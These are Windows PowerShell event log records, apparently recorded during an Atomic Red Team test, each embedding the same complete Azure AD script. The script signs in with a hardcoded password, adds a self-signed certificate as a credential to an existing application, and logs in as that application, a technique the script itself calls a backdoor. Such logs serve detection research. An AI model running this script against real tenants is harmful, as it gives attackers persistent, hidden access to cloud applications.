{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.2040891"},"EventRecordID":"1159","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.2040891"},"EventRecordID":"1160","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.2040891"},"EventRecordID":"1161","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.2344003"},"EventRecordID":"1162","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.2344003"},"EventRecordID":"1163","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.2344003"},"EventRecordID":"1164","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:38.5164509"},"EventRecordID":"1165","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=030655dc-7cf6-4fc2-925f-e4f39528ab93\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:39.8131065"},"EventRecordID":"1166","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Certificate, Started, \tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=030655dc-7cf6-4fc2-925f-e4f39528ab93\r\n\tPipelineId=2\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-11-02 11:03:40.1234611"},"EventRecordID":"1167","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=6ba56ece-7d11-43ce-b74a-c0e16d6e39c2\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$app = Get-AzureADApplication -SearchString \"SuperApp\" | Select-Object -First 1\r\nif ($app -eq $null) { Write-Warning \"Application not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real script), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADApplicationKeyCredential -ObjectId $app.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $app.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=030655dc-7cf6-4fc2-925f-e4f39528ab93\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
